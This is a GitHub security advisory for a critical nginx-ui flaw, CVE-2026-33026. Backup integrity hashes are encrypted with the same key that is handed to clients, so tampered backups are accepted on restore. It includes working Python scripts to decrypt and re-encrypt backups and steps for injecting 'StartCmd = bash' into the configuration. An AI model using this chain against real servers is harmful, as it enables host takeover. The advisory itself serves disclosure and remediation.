# [C] nginx-ui Backup Restore Allows Tampering with Encrypted Backups

## Summary
Severity: Critical
Advisory: GHSA-fhh2-gg7w-gwpq
CVE: CVE-2026-33026
CWE: CWE-312, CWE-347, CWE-354
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-fhh2-gg7w-gwpq
Type: github-advisory

## Affected
- Go: `github.com/0xJacky/Nginx-UI` — affected >=0 <1.9.10-0.20260315015203-f61bcec547c0

## Details
## Summary
The `nginx-ui` backup restore mechanism allows attackers to tamper with encrypted backup archives and inject malicious configuration during restoration.

## Details
The backup format lacks a trusted integrity root. Although files are encrypted, the encryption key and IV are provided to the client and the integrity metadata (`hash_info.txt`) is encrypted using the same key. As a result, an attacker who can access the backup token can decrypt the archive, modify its contents, recompute integrity hashes, and re-encrypt the bundle.

Because the restore process does not enforce integrity verification and accepts backups even when hash mismatches are detected, the system restores attacker-controlled configuration even when integrity verification warnings are raised. In certain configurations this may lead to arbitrary command execution on the host.

The backup system is built around the following workflow:

1. Backup files are compressed into `nginx-ui.zip` and `nginx.zip`.
2. The files are encrypted using AES-256-CBC.
3. SHA-256 hashes of the encrypted files are stored in `hash_info.txt`.
4. The hash file is also encrypted with the same AES key and IV.
5. The AES key and IV are provided to the client as a "backup security token".

This architecture creates a circular trust model:

- The encryption key is available to the client.
- The integrity metadata is encrypted with that same key.
- The restore process trusts hashes contained within the backup itself.

Because the attacker can decrypt and re-encrypt all files using the provided token, they can also recompute valid hashes for any modified content.

### Environment
- **OS**: Kali Linux 6.17.10-1kali1 (6.17.10+kali-amd64)
- **Application Version**: nginx-ui v2.3.3 (513) e5da6dd (go1.26.0)
- **Deployment**: Docker Container default installation
- **Relevant Source Files**:
  - `backup_crypto.go`
  - `backup.go`
  - `restore.go`
  - `SystemRestoreContent.vue`


## PoC
1. Generate a backup and extract the security token (Key and IV) from the HTTP response headers or the `.key` file.
    <img width="1483" height="586" alt="image" src="https://github.com/user-attachments/assets/857a1b3f-ce66-4929-a165-2f28393df17f" />

2. Decrypt the `nginx-ui.zip` archive using the obtained token.
``` 
import base64
import os
import sys
import zipfile
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_aes_cbc(encrypted_data: bytes, key_b64: str, iv_b64: str) -> bytes:
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)
    return unpad(decrypted, AES.block_size)

def process_local_backup(file_path, token, output_dir):
    key_b64, iv_b64 = token.split(":")
    os.makedirs(output_dir, exist_ok=True)
    print(f"[*] File processing: {file_path}")
    
    with zipfile.ZipFile(file_path, 'r') as main_zip:
        main_zip.extractall(output_dir)
        
    files_to_decrypt = ["hash_info.txt", "nginx-ui.zip", "nginx.zip"]
    
    for filename in files_to_decrypt:
        path = os.path.join(output_dir, filename)
        if os.path.exists(path):
            with open(path, "rb") as f:
                encrypted = f.read()
            
            decrypted = decrypt_aes_cbc(encrypted, key_b64, iv_b64)
            
            out_path = path + ".decrypted"
            with open(out_path, "wb") as f:
                f.write(decrypted)
            print(f"[*] Successfully decrypted: {out_path}")

# Manual config
BACKUP_FILE = "backup-20260314-151959.zip" 
TOKEN = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
OUTPUT = "decrypted"

if __name__ == "__main__":
    process_local_backup(BACKUP_FILE, TOKEN, OUTPUT)
```

3. Modify the contained `app.ini` to inject malicious configuration (e.g., `StartCmd = bash`).
4. Re-compress the files and calculate the new SHA-256 hash.
5. Update `hash_info.txt` with the new, legitimate-looking hashes for the modified files.
6. Encrypt the bundle again using the original Key and IV.
```
import base64
import hashlib
import os
import zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_file(data, key_b64, iv_b64):
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data, AES.block_size))

def build_rebuilt_backup(files, token, output_filename="backup_rebuild.zip"):
    key_b64, iv_b64 = token.split(":")
    
    encrypted_blobs = {}
    for fname in files:
        with open(fname, "rb") as f:
            data = f.read()
        
        blob = encrypt_file(data, key_b64, iv_b64)

        target_name = fname.replace(".decrypted", "")
        encrypted_blobs[target_name] = blob
        print(f"[*] Cipher {target_name}: {len(blob)} bytes")

    hash_content = ""
    for name, blob in encrypted_blobs.items():
        h = hashlib.sha256(blob).hexdigest()
        hash_content += f"{name}: {h}\n"
    
    encrypted_hash_info = encrypt_file(hash_content.encode(), key_b64, iv_b64)
    encrypted_blobs["hash_info.txt"] = encrypted_hash_info

    with zipfile.ZipFile(output_filename, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        for name, blob in encrypted_blobs.items():
            zf.writestr(name, blob)
            
    print(f"\n[*] Backup rebuild: {output_filename}")
    print(f"[*] Verificando integridad...")

TOKEN = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
FILES = ["nginx-ui.zip.decrypted", "nginx.zip.decrypted"]

if __name__ == "__main__":
    build_rebuilt_backup(FILES, TOKEN)
```
7. Upload the tampered backup to the `nginx-ui` restore interface.
   <img width="1059" height="290" alt="image" src="https://github.com/user-attachments/assets/66872685-b85b-4c81-ae24-13c811acba9a" />


8. **Observation**: The system accepts the modified backup. Although a warning may appear, the restoration proceeds and the malicious configuration is applied, granting the attacker arbitrary command execution on the host.
   <img width="1316" height="627" alt="image" src="https://github.com/user-attachments/assets/2752749e-ac39-4d60-88ca-5058b8e840a6" />



## Impact
An attacker capable of uploading or supplying a malicious backup can modify application configuration and internal state during restoration.

Potential impacts include:

- Persistent configuration tampering
- Backdoor insertion into nginx configuration
- Execution of attacker-controlled commands depending on configuration settings
- Full compromise of the nginx-ui instance

The severity depends on the restore permissions and deployment configuration.

## Recommended Mitigation

1. **Introduce a trusted integrity root**
Integrity metadata must not be derived solely from data contained in the backup. Possible solutions include:
   - Signing backup metadata using a server-side private key
   - Storing integrity metadata separately from the backup archive

2. **Enforce integrity verification**
The restore operation must abort if hash verification fails.

3. **Avoid circular trust models**
If encryption keys are distributed to clients, the backup must not rely on attacker-controlled metadata for integrity validation.

4. **Optional cryptographic improvements**
While not sufficient alone, switching to an authenticated encryption scheme such as AES-GCM can simplify integrity protection if the encryption keys remain secret.

This vulnerability arises from a circular trust model where integrity metadata is protected using the same key that is provided to the client, allowing attackers to recompute valid integrity data after modifying the archive.

## Regression

The previously reported vulnerability (GHSA-g9w5-qffc-6762) addressed unauthorized access to backup files but did not resolve the underlying cryptographic design issue.

The backup format still allows attacker-controlled modification of encrypted backup contents because integrity metadata is protected using the same key distributed to clients.

As a result, the fundamental integrity weakness remains exploitable even after the previous fix.

A patched version is available at https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4.

## References
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-fhh2-gg7w-gwpq
- https://nvd.nist.gov/vuln/detail/CVE-2026-33026
- https://github.com/0xJacky/nginx-ui/commit/f61bcec547c0f305e35348d6440ef156c1d5c3cb
- https://github.com/0xJacky/nginx-ui
- https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4
- https://github.com/advisories/GHSA-g9w5-qffc-6762
- https://pkg.go.dev/vuln/GO-2026-4903
